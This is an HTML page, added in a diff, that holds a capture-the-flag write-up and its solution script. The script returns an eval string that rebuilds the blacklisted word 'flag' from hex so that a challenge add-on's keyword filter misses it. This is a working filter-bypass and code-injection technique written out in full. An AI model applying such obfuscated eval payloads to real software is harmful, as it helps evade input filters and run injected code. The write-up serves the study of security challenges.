@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+    <head><meta charset="UTF-8"></head>
+	<body>
+		<h1>Simple Solution</h1>
+		<p>---------------</p>
+        <p id="writeup">
+            The solution is inside 'script'. First of all, you need to bypass the blacklist filter. In order to accomplish that, one solution could be to convert 'flag' into hex and return a code converting the hex to ascii. After that you need to use eval to convert the string into the content of the variable.
+        </p>
+        <p id="resolve" style="white-space: pre-wrap;">
+            // Declare a function with the name that is going to be called from 
+            // the content-script of the addon.
+            function getFlag() {
+                
+                // Declare an object to return
+                var obj = {
+                    // Initialize the function that is going to be called.
+                    // This function includes the code to convert hex to ascii
+                    // Uses eval to convert "flag" to the content
+                    calculate: function () { 
+                                return "eval(
+                                    (() => {
+                                        var str = ''; 
+                                        for(element of ['66', '6c', '61', '67']){
+                                            str += String.fromCharCode(parseInt(element,16))
+                                        }; 
+                                        return str;
+                                    })()
+                                )"
+                    }
+                };
+
+                // Return the object to the addon
+                return obj;
+            }
+        </p>
+	</body>
+    <script>
+        function getFlag() {
+            // Generate hex of 'flag'
+            // var flag = "flag";
+            // var arr = [];
+            // for (var i = 0; i < flag.length; i++){
+            //     arr.push(Number(flag.charCodeAt(i)).toString(16));
+            // }
+            // flag == 666c6167
+
+
+            // Pass hex to ascii code
+            // And use eval to convert "flag" string
+            // into variable content
+            var bubu = {
+                calculate: function () { 
+                    return "eval((() => {var str = ''; for(element of ['66', '6c', '61', '67']){str += String.fromCharCode(parseInt(element,16))}; return str;})())"
+                }
+            };
+            return bubu;
+        }
+    </script>
+</html> 
